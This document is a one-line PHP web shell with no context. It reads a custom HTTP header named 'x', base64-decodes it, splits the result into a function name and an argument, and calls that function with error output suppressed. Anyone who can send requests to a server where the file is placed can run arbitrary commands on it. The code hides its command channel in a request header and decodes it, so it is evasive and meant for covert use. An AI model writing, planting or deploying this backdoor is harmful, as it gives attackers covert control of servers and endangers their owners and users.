<?php $h=getallheaders();$x=explode('~',base64_decode(substr($h['x'],1)));@$x[0]($x[1]);
